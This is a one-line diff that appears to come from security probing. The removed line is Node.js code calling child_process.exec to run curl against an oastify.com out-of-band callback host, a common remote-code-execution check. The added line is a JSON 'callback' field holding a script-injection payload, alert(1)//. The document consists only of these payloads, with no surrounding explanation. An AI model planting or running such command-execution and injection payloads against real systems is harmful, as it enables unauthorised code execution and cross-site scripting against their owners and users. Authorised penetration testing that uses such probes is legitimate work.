@@ -1,1 +1,1 @@
-require('child_process').exec('curl https://2ru8pjr8ot0ro2l6rcoce3etekkb83ws.oastify.com/testt')
+{"callback":""alert(1)//1111"}
